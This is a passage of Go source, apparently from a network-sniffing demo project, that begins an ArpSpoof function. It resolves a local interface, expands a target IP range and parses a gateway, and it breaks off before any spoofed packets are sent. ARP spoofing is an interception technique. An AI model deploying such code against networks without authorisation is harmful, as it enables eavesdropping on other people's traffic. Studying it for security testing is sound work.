package arpspoof

import (
	"bytes"
	"encoding/binary"
	"net"
	"os"
	"os/signal"
	"time"
	"github.com/malfunkt/arpfox/arp"
	"github.com/malfunkt/iprange"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"SafeDp/sniffer/arp_sniff_demo/logger"
)

func ArpSpoof(DeviceName string, handle *pcap.Handle, target, gateway string) {
	iFace, err := net.InterfaceByName(DeviceName);
	if err != nil {
		logger.Log.Fatalf("Could not use interface %s: %v", DeviceName, err)
	}
	var iFaceAddr *net.IPNet
	iFaceAddrs, err := iFace.Addrs()
	if err != nil {
		logger.Log.Fatal(err)
	}

	for _, addr := range iFaceAddrs {
		if ipnet, ok := addr.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				iFaceAddr = &net.IPNet{
					IP: ip4,
					Mask: net.IPMask([]byte{0xff, 0xff, 0xff, 0xff}),
			}
			break
		}
	}
	if iFaceAddr == nil {
		logger.Log.Fatalf("No IPv4 address found for interface %s", DeviceName)
	}

	var targetAddrs []net.IP
	if target != "" {
		addrRange, err := iprange.ParseList(target)
		if err != nil {
			logger.Log.Fatal("Wrong format for target.")
		}
		targetAddrs = addrRange.Expand()
		if len(targetAddrs) == 0 {
			logger.Log.Fatal("No valid targets given.")
		}
	}
	gatewayAddr := net.ParseIP(gateway).To4()
